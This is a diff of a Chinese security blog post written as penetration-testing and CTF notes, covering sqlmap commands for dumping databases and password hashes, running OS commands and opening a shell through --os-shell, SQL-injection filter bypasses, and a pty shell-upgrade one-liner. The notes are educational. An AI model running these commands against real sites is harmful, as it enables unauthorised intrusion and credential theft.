+<h5 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --dbs   //查看所有数据库</span><br><span class="line">sqlmap -u &quot;url&quot; --users //查看所有用户</span><br><span class="line">sqlmap -u &quot;url&quot; --current-db //查看当前的数据库</span><br><span class="line">sqlmap -u &quot;url&quot; --current-user //产看当前的用户</span><br><span class="line">sqlmap -u &quot;url&quot; --is-dba //查看是否是最高权限</span><br><span class="line">sqlmap -u &quot;url&quot; --passwords //查看所有密码</span><br><span class="line">sqlmap -u &quot;url&quot; –hostname //查看主机名</span><br><span class="line">sqlmap -u &quot;url&quot; privileges -U username //查看用户权限</span><br><span class="line">sqlmap -u &quot;url&quot; –roles //查看用户角色</span><br></pre></td></tr></table></figure>
+
+<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --os-cmd &quot;cmd&quot;  //执行cmd代表的命令，如cd C:/</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;url&quot; --os-shell  //进入数据库自带的shell</span><br></pre></td></tr></table></figure>
+
+<h5 id="从文本中获取多个目标扫描"><a href="#从文本中获取多个目标扫描" class="headerlink" title="从文本中获取多个目标扫描"></a>从文本中获取多个目标扫描</h5><p>参数：<code>-m</code></p>
+<p>文件中保存<code>url</code>格式如下，<code>sqlmap</code>会一个一个检测</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www.target1.com/vuln1.php?q=foobar</span><br><span class="line"></span><br><span class="line">www.target2.com/vuln2.asp?id=1</span><br><span class="line"></span><br><span class="line">www.target3.com/vuln3/id/1*</span><br></pre></td></tr></table></figure>
+
+<h5 id="从文件中加载HTTP请求"><a href="#从文件中加载HTTP请求" class="headerlink" title="从文件中加载HTTP请求"></a>从文件中加载HTTP请求</h5><p>参数：<code>-r</code></p>
+<p><code>sqlmap</code>可以从一个文本文件中获取<code>HTTP</code>请求，这样就可以跳过设置一些其他参数（比如<code>cookie，POST</code>数据，等等）。</p>
+<p>比如文本文件内如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /vuln.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: www.target.com</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/4.0</span><br><span class="line"></span><br><span class="line">id=1</span><br></pre></td></tr></table></figure>
+
+<p>当请求是HTTPS的时候你需要配合这个<code>–force-ssl</code>参数来使用，或者你可以在Host头后面加上:<code>44</code></p>
+<h5 id="爬行网站URL"><a href="#爬行网站URL" class="headerlink" title="爬行网站URL"></a>爬行网站URL</h5><p>参数：<code>–crawl</code></p>
+<p><code>sqlmap</code>可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。</p>
+<p>例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/&quot; --batch --crawl=3</span><br><span class="line">[...]</span><br><span class="line">[xx:xx:53] [INFO] starting crawler</span><br><span class="line">[xx:xx:53] [INFO] searching for links with depth 1</span><br><span class="line">[xx:xx:53] [WARNING] running in a single-thread mode. This could take a while</span><br><span class="line">[xx:xx:53] [INFO] searching for links with depth 2</span><br><span class="line">[xx:xx:54] [INFO] heuristics detected web page charset &apos;ascii&apos;</span><br><span class="line">[xx:xx:00] [INFO] 42/56 links visited (75%)</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<h5 id="常用的tamper脚本"><a href="#常用的tamper脚本" class="headerlink" title="常用的tamper脚本"></a>常用的tamper脚本</h5><blockquote>
+<p><a href="https://xz.aliyun.com/t/2746" target="_blank" rel="noopener">https://xz.aliyun.com/t/2746</a></p>
 </blockquote>
-<h1 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h1><p> 内联，就是将反引号内命令的输出作为输入执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS$9`ls`</span><br></pre></td></tr></table></figure>
-
-<h1 id="过滤bash"><a href="#过滤bash" class="headerlink" title="过滤bash"></a>过滤bash</h1><blockquote>
-<p>用sh。sh的大部分脚本都可以在bash下运行。 </p>
+<h5 id="sqlmap-–os-shell原理"><a href="#sqlmap-–os-shell原理" class="headerlink" title="sqlmap –os-shell原理"></a>sqlmap –os-shell原理</h5><h6 id="注入sqlmap马"><a href="#注入sqlmap马" class="headerlink" title="注入sqlmap马"></a>注入sqlmap马</h6><blockquote>
+<p><a href="https://xz.aliyun.com/t/7942#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/7942#toc-1</a></p>
 </blockquote>
-<h1 id="session保存形式和命名"><a href="#session保存形式和命名" class="headerlink" title="session保存形式和命名"></a>session保存形式和命名</h1><p> session是以文件的形式保存的。php.ini中有个配置项–session.save_path= “”;这个里面填写的路径，将会使session文件保存在该路径下。session文件的命名格式是：”sess_[PHPSESSID的值]”。每一个文件，里面保存了一个会话的数据。其实只要使用代码$_SESSION[‘user_id’] = $value;就会促发php的session机制，结果往对应的session文件中写入一个值。 </p>
-<h1 id="proc-pid-fd"><a href="#proc-pid-fd" class="headerlink" title="/proc/[pid]/fd"></a>/proc/[pid]/fd</h1><p> <strong>在linux里如果打开了一个文件而没有关闭，就算删除了文件（即rm -f flag.txt）在/proc/[pid]/fd下还是会存在,</strong> </p>
-<h1 id="sprintf-漏洞"><a href="#sprintf-漏洞" class="headerlink" title="sprintf()漏洞"></a>sprintf()漏洞</h1><ol>
-<li>%1$s —— 这种办法原理是%1$s会将第一个参数用string类型输出，而这道题中第一个参数便是admin.php的源码，语句是：</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(sprintf(&quot;$url method&amp;content_size:&quot;GET%1$s%d&quot;, $detect));  // %1$s会以字符串格式输出$detect，而%d会输出0</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>%s% —— 这种办法的原理是sprintf()函数中%可以转义掉%，这样语句就变成了：</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(sprintf(&quot;$url method&amp;content_size:&quot;GET%s%%d&quot;, $detect));  // %d前的%被转义，因此失</span><br></pre></td></tr></table></figure>
-
-<h1 id="绕过php后缀"><a href="#绕过php后缀" class="headerlink" title="绕过php后缀"></a>绕过php后缀</h1><h3 id="pathinfo函数后缀名黑名单绕过"><a href="#pathinfo函数后缀名黑名单绕过" class="headerlink" title="pathinfo函数后缀名黑名单绕过"></a>pathinfo函数后缀名黑名单绕过</h3><p>在做路径处理的时候，会递归的删除掉路径中存在的 /. </p>
-<h1 id="获取交互式shell"><a href="#获取交互式shell" class="headerlink" title="获取交互式shell"></a>获取交互式shell</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure>
+<p>必要条件：</p>
+<ul>
+<li>知道网站绝对路径</li>
+<li>拥有网站的写入权限</li>
+<li>Secure_file_priv参数为空或者为指定路径。</li>
+</ul>
+<p>普通注入–os-shell主要是通过上传一个sqlmap的马，然后通过马来进行命令执行。</p>
+<h4 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h4><h5 id="过滤符号"><a href="#过滤符号" class="headerlink" title="过滤符号"></a>过滤符号</h5><h6 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h6><blockquote>
+<p>/**/</p>
+<p>+</p>
+</blockquote>
+<h6 id="过滤"><a href="#过滤" class="headerlink" title="过滤 # -"></a>过滤 <em># -</em></h6><blockquote>
+<p>;%00</p>
+</blockquote>
+<h6 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤="></a>过滤=</h6><blockquote>
+<p>like</p>
+</blockquote>
+<h5 id="过滤字符串"><a href="#过滤字符串" class="headerlink" title="过滤字符串"></a>过滤字符串</h5><h2 id="获取交互式shell"><a href="#获取交互式shell" class="headerlink" title="获取交互式shell"></a>获取交互式shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure>
 
 
     </div>
@@ -386,7 +561,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP字符串解析漏洞"><span class="nav-number">1.</span> <span class="nav-text">PHP字符串解析漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php别名"><span class="nav-number">2.</span> <span class="nav-text">php别名</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Unicode欺骗"><span class="nav-number">3.</span> <span class="nav-text">Unicode欺骗</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#超全局变量"><span class="nav-number">4.</span> <span class="nav-text">超全局变量</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GIT恢复"><span class="nav-number">5.</span> <span class="nav-text">GIT恢复</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JSON转义字符绕过"><span class="nav-number">6.</span> <span class="nav-text">JSON转义字符绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#路径穿越漏洞"><span class="nav-number">7.</span> <span class="nav-text">路径穿越漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#上传后门"><span class="nav-number">8.</span> <span class="nav-text">上传后门</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Nginx重要文件位置"><span class="nav-number">9.</span> <span class="nav-text">Nginx重要文件位置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#IDNA"><span class="nav-number">10.</span> <span class="nav-text">IDNA</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#命令中空格被过滤的解决方法"><span class="nav-number">11.</span> <span class="nav-text">命令中空格被过滤的解决方法</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#内联执行"><span class="nav-number">12.</span> <span class="nav-text">内联执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#过滤bash"><span class="nav-number">13.</span> <span class="nav-text">过滤bash</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#session保存形式和命名"><span class="nav-number">14.</span> <span class="nav-text">session保存形式和命名</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#proc-pid-fd"><span class="nav-number">15.</span> <span class="nav-text">/proc/[pid]/fd</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sprintf-漏洞"><span class="nav-number">16.</span> <span class="nav-text">sprintf()漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过php后缀"><span class="nav-number">17.</span> <span class="nav-text">绕过php后缀</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pathinfo函数后缀名黑名单绕过"><span class="nav-number">17.0.1.</span> <span class="nav-text">pathinfo函数后缀名黑名单绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#获取交互式shell"><span class="nav-number">18.</span> <span class="nav-text">获取交互式shell</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#基本渗透流程"><span class="nav-number">1.</span> <span class="nav-text">基本渗透流程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#信息搜集"><span class="nav-number">1.1.</span> <span class="nav-text">信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#whois查询"><span class="nav-number">1.1.1.</span> <span class="nav-text">whois查询</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过cdn"><span class="nav-number">1.1.2.</span> <span class="nav-text">绕过cdn</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#检测是否有cdn"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">检测是否有cdn</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查找真实ip"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">查找真实ip</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#查询历史DNS记录"><span class="nav-number">1.1.2.2.1.</span> <span class="nav-text">查询历史DNS记录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#查询子域名"><span class="nav-number">1.1.2.2.2.</span> <span class="nav-text">查询子域名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#网络空间引擎搜索法"><span class="nav-number">1.1.2.2.3.</span> <span class="nav-text">网络空间引擎搜索法</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查子域名-c段-旁站"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">查子域名,c段,旁站</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#服务器相关信息"><span class="nav-number">1.1.3.</span> <span class="nav-text">服务器相关信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞挖掘"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞挖掘</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sql注入"><span class="nav-number">1.2.1.</span> <span class="nav-text">sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sql注入类型"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">sql注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#按注入点类型分类"><span class="nav-number">1.2.1.1.1.</span> <span class="nav-text">按注入点类型分类</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#一-数字型注入"><span class="nav-number">1.2.1.1.1.1.</span> <span class="nav-text">一:数字型注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#二-字符型注入"><span class="nav-number">1.2.1.1.1.2.</span> <span class="nav-text">二:字符型注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#三-搜索型注入点"><span class="nav-number">1.2.1.1.1.3.</span> <span class="nav-text">三:搜索型注入点</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#按数据注入方式分类"><span class="nav-number">1.2.1.1.2.</span> <span class="nav-text">按数据注入方式分类</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#一-get注入"><span class="nav-number">1.2.1.1.2.1.</span> <span class="nav-text">一:get注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#二-post注入"><span class="nav-number">1.2.1.1.2.2.</span> <span class="nav-text">二:post注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#三-cookie注入"><span class="nav-number">1.2.1.1.2.3.</span> <span class="nav-text">三:cookie注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#四-HTTP头注入"><span class="nav-number">1.2.1.1.2.4.</span> <span class="nav-text">四:HTTP头注入</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#按执行类型分类"><span class="nav-number">1.2.1.1.3.</span> <span class="nav-text">按执行类型分类</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#一-基于布尔的盲注"><span class="nav-number">1.2.1.1.3.1.</span> <span class="nav-text">一:基于布尔的盲注</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#二-基于时间的盲注"><span class="nav-number">1.2.1.1.3.2.</span> <span class="nav-text">二:基于时间的盲注</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#三-基于报错的注入"><span class="nav-number">1.2.1.1.3.3.</span> <span class="nav-text">三:基于报错的注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#四-堆叠注入"><span class="nav-number">1.2.1.1.3.4.</span> <span class="nav-text">四:堆叠注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#五-DNSLOG注入"><span class="nav-number">1.2.1.1.3.5.</span> <span class="nav-text">五:DNSLOG注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#六-宽字节注入"><span class="nav-number">1.2.1.1.3.6.</span> <span class="nav-text">六:宽字节注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#七-sql正则注入"><span class="nav-number">1.2.1.1.3.7.</span> <span class="nav-text">七:sql正则注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlmap工具使用"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">sqlmap工具使用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#sqlmap常用参数"><span class="nav-number">1.2.1.2.1.</span> <span class="nav-text">sqlmap常用参数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sqlmap各种注入点方法"><span class="nav-number">1.2.1.2.2.</span> <span class="nav-text">sqlmap各种注入点方法</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#get注入点方法"><span class="nav-number">1.2.1.2.2.1.</span> <span class="nav-text">get注入点方法</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#post注入点方法"><span class="nav-number">1.2.1.2.2.2.</span> <span class="nav-text">post注入点方法</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#cookie注入点方法"><span class="nav-number">1.2.1.2.2.3.</span> <span class="nav-text">cookie注入点方法</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#查看数据库"><span class="nav-number">1.2.1.2.3.</span> <span class="nav-text">查看数据库</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#命令执行"><span class="nav-number">1.2.1.2.4.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#从文本中获取多个目标扫描"><span class="nav-number">1.2.1.2.5.</span> <span class="nav-text">从文本中获取多个目标扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#从文件中加载HTTP请求"><span class="nav-number">1.2.1.2.6.</span> <span class="nav-text">从文件中加载HTTP请求</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#爬行网站URL"><span class="nav-number">1.2.1.2.7.</span> <span class="nav-text">爬行网站URL</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#常用的tamper脚本"><span class="nav-number">1.2.1.2.8.</span> <span class="nav-text">常用的tamper脚本</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sqlmap-–os-shell原理"><span class="nav-number">1.2.1.2.9.</span> <span class="nav-text">sqlmap –os-shell原理</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#注入sqlmap马"><span class="nav-number">1.2.1.2.9.1.</span> <span class="nav-text">注入sqlmap马</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤绕过"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">过滤绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#过滤符号"><span class="nav-number">1.2.1.3.1.</span> <span class="nav-text">过滤符号</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#过滤空格"><span class="nav-number">1.2.1.3.1.1.</span> <span class="nav-text">过滤空格</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#过滤"><span class="nav-number">1.2.1.3.1.2.</span> <span class="nav-text">过滤 # -</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#过滤-1"><span class="nav-number">1.2.1.3.1.3.</span> <span class="nav-text">过滤=</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#过滤字符串"><span class="nav-number">1.2.1.3.2.</span> <span class="nav-text">过滤字符串</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取交互式shell"><span class="nav-number">1.3.</span> <span class="nav-text">获取交互式shell</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -402,7 +577,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">38</span>
+          <span class="site-state-item-count">37</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -459,7 +634,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共35k字</span>
+  <span class="post-count">博客全站共34.2k字</span>
 </div>
 <br>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.0.0
